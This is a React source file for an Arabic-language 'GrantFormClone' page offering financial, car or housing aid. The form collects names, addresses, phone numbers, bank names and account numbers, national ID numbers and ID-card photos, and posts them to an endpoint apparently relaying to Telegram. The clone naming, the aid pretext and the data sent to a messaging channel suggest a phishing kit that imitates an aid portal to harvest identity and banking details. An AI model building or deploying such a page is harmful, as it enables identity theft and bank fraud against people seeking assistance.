import { useState, useRef } from "react";
import SuccessSubmission from "./SuccessSubmission";

export default function GrantFormClone() {
  const [form, setForm] = useState({
    type: "",
    name: "",
    email: "",
    address: "",
    phone: "",
    nationality: "",
    bankName: "",
    bankNum: "",
    explain: "",
    idNum: "",
  });

  const [file, setFile] = useState(null);
  const [errors, setErrors] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);
  const fileInputRef = useRef(null);


  const MAX_MB = 15;
  const MAX_BYTES = MAX_MB * 1024 * 1024;

  function formatBytes(bytes) {
    if (bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB", "TB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
  }

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const validate = () => {
    const next = {};
    if (!form.type) next.type = "الرجاء اختيار نوع الطلب";
    if (!form.name.trim()) next.name = "الرجاء إدخال الاسم";
    if (!form.email.trim()) next.email = "الرجاء إدخال البريد الإلكتروني";
    if (!form.address.trim()) next.address = "الرجاء إدخال العنوان";
    if (!form.phone.trim()) next.phone = "الرجاء إدخال رقم الهاتف";
    if (!form.nationality.trim()) next.nationality = "الرجاء إدخال الجنسية";
    if (!file) {
      next.file = "الرجاء رفع صورة الهوية";
    } else {
      if (file.size > MAX_BYTES) next.file = `الحجم الأقصى ${MAX_MB}MB`;
      const allowed = ["image/jpeg", "image/png", "image/webp", "image/gif", "application/pdf"];
      if (!allowed.includes(file.type)) next.file = "الملف يجب أن يكون صورة أو PDF";
    }
    setErrors(next);
    return Object.keys(next).length === 0;
  };

  const onSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;
    setSubmitting(true);

    try {
      const requestId = Math.floor(Math.random() * 90000) + 10000;

      const formData = new FormData();
      formData.append("requestId", requestId);
      Object.entries(form).forEach(([key, value]) => {
        formData.append(key, value);
      });
      formData.append("file", file);

      await fetch("/api/sendToTel", {
        method: "POST",
        body: formData,
      });

      setSuccess(true)

      await fetch('/api/sendEmail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: form.email, name: form.name, requestId }),
      });

    } catch (fireErr) {
      console.error('Firestore save failed', fireErr);
      // keep user informed but don't treat this as a fatal error for the UI flow
      alert('تم إرسال الطلب، لكن فشل حفظ البيانات في قاعدة البيانات. حاول لاحقًا.');
      setSubmitting(false);
      return;
    }
    finally {
      setSubmitting(false);
    }
  };

  return (
    <div dir="rtl" className="min-h-scree bg-[#013a19] text-white">
      {success ? <SuccessSubmission /> :
        <div className="w-full max-w-2xl mx-auto">
          <div className="text-center mb-6">
            <h1 className="text-2xl md:text-3xl font-bold">تسجيل جديد</h1>
          </div>

          <div className="rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8">
            <form onSubmit={onSubmit} className="space-y-6">
              {/* نوع الطلب */}
              <div>
                <label className="block mb-1">تحديد نوع الطلب *</label>
                <select name="type" value={form.type} onChange={handleChange} className={`w-full border text-black bg-white rounded-xl px-4 py-2.5 ${errors.type ? "border-red-400" : "border-gray-300"}`}>
                  <option value="" disabled>اختر نوع الطلب</option>
                  <option value="financial">طلب مساعدة مالية</option>
                  <option value="car">طلب تقديم سيارة</option>
                  <option value="housing">طلب تقديم الاسكان</option>
                  <option value="housing">آخر...</option>
                </select>
                {errors.type && <p className="text-red-600 text-sm mt-1">{errors.type}</p>}
              </div>

              {/* الاسم */}
              <div>
                <label className="block mb-1">الاسم *</label>
                <input name="name" value={form.name} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.name ? "border-red-400" : "border-gray-300"}`} />
                {errors.name && <p className="text-red-600 text-sm mt-1">{errors.name}</p>}
              </div>

              {/* البريد الإلكتروني */}
              <div>
                <label className="block mb-1">البريد الإلكتروني *</label>
                <input type="email" name="email" value={form.email} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.email ? "border-red-400" : "border-gray-300"}`} />
                {errors.email && <p className="text-red-600 text-sm mt-1">{errors.email}</p>}
              </div>

              {/* الجنسية */}
              <div>
                <label className="block mb-1">الجنسية *</label>
                <input name="nationality" value={form.nationality} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.nationality ? "border-red-400" : "border-gray-300"}`} />
                {errors.nationality && <p className="text-red-600 text-sm mt-1">{errors.nationality}</p>}
              </div>

              {/* العنوان */}
              <div>
                <label className="block mb-1">العنوان *</label>
                <input name="address" value={form.address} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.address ? "border-red-400" : "border-gray-300"}`} />
                {errors.address && <p className="text-red-600 text-sm mt-1">{errors.address}</p>}
              </div>

              {/* رقم الهاتف */}
              <div>
                <label className="block mb-1">رقم الهاتف *</label>
                <input type="tel" name="phone" value={form.phone} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.phone ? "border-red-400" : "border-gray-300"}`} />
                {errors.phone && <p className="text-red-600 text-sm mt-1">{errors.phone}</p>}
              </div>

              {/*اسم البنك */}
              <div>
                <label className="block mb-1">اسم البنك *</label>
                <input name="bankName" value={form.bankName} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.bankName ? "border-red-400" : "border-gray-300"}`} />
                {errors.bankName && <p className="text-red-600 text-sm mt-1">{errors.bankName}</p>}
              </div>

              {/*رثم البنك */}
              <div>
                <label className="block mb-1">رقم البنك*</label>
                <input name="bankNum" value={form.bankNum} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.bankNum ? "border-red-400" : "border-gray-300"}`} />
                {errors.bankNum && <p className="text-red-600 text-sm mt-1">{errors.bankNum}</p>}
              </div>

              {/*رقم الهويه */}
              <div>
                <label className="block mb-1">رقم الهوية*</label>
                <input name="idNum" value={form.idNum} onChange={handleChange} className={`w-full border rounded-xl px-4 py-2.5 ${errors.idNum ? "border-red-400" : "border-gray-300"}`} />
                {errors.idNum && <p className="text-red-600 text-sm mt-1">{errors.idNum}</p>}
              </div>

              {/* صورة الهوية */}
              <div className="space-y-2">
                <label htmlFor="idImage" className="block text-sm font-medium text-white">
                  صورة الهوية
                </label>

                <div
                  className={`rounded-xl border-2 border-dashed bg-transparent p-4 transition-colors ${errors.file ? "border-red-300" : "border-gray-300 bg-gray-50"
                    }`}
                >
                  <input
                    id="idImage"
                    ref={fileInputRef}
                    type="file"
                    accept="image/*,application/pdf"
                    onChange={(e) => setFile(e.target.files?.[0] ?? null)}
                    className="block w-full text-sm text-white file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:bg-gray-800 file:text-white hover:file:bg-gray-700 cursor-pointer"
                  />
                  <p className="text-xs mt-2">ملفات مدعومة (الحد الأقصى {MAX_MB}MB)</p>
                  {file && (
                    <div className="mt-3 text-sm">
                      <div className="flex items-center gap-2">
                        <span className="truncate max-w-[60ch]">{file.name}</span>
                        <span className="text-white">• {formatBytes(file.size)}</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          setFile(null);
                          fileInputRef.current && (fileInputRef.current.value = "");
                        }}
                        className="mt-2 text-xs underline hover:no-underline"
                      >
                        إزالة الملف
                      </button>
                    </div>
                  )}
                </div>
                {errors.file && (
                  <p className="text-sm text-red-600 mt-1">{errors.file}</p>
                )}
              </div>

              {/*شرح الحاله*/}
              <div>
                <label className="block mb-1">شرح مختصر عن الحالة *</label>
                <input name="explain" value={form.explain} onChange={handleChange} className={`w-full h-22 border rounded-xl px-4 py-2.5 ${errors.explain ? "border-red-400" : "border-gray-300"}`} />
                {errors.explain && <p className="text-red-600 text-sm mt-1">{errors.explain}</p>}
              </div>


              <div>
                <button type="submit" disabled={submitting} className="bg-gray-900 text-white px-6 py-3 rounded-xl hover:bg-black w-full">
                  {submitting ? "جارٍ الإرسال..." : "تـسجيل"}
                </button>
              </div>
            </form>
          </div>
          <p className="text-xs text-center mt-4 text-gray-400 hidden lg:block">
            جميع الحقوق محفوظة @ 2025
          </p>
        </div>
      }
    </div>
  );
}